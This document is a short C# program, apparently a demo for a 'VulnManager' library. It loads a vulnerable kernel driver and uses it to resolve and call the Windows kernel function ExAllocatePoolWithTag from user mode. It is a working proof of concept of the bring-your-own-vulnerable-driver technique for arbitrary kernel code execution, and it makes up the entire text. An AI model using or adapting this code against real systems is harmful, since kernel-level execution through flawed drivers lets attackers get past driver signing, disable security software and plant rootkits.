using System;
using System.Runtime.InteropServices;

class Program
{
    static void Main(string[] args)
    {
        using (var vuln = VulnManager.EasyCreate())
        {
            if (vuln == null)
            {
                Console.WriteLine("Failed to load driver");
                return;
            }

            var baseAddr = VulnManager.GetKernelModuleAddress("ntoskrnl.exe");
            var exportAddr = vuln.GetKernelModuleExport(baseAddr, "ExAllocatePoolWithTag");

            Console.WriteLine("ExAllocatePoolWithTag exportAddr: " + exportAddr);

            ulong ret = 0;
            vuln.CallKernelFunction(exportAddr, out ret, 0, 0x1000, 0xDEAD);

            Console.WriteLine("ExAllocatePoolWithTag ret: " + ret.ToString("X"));
        }
    }
}
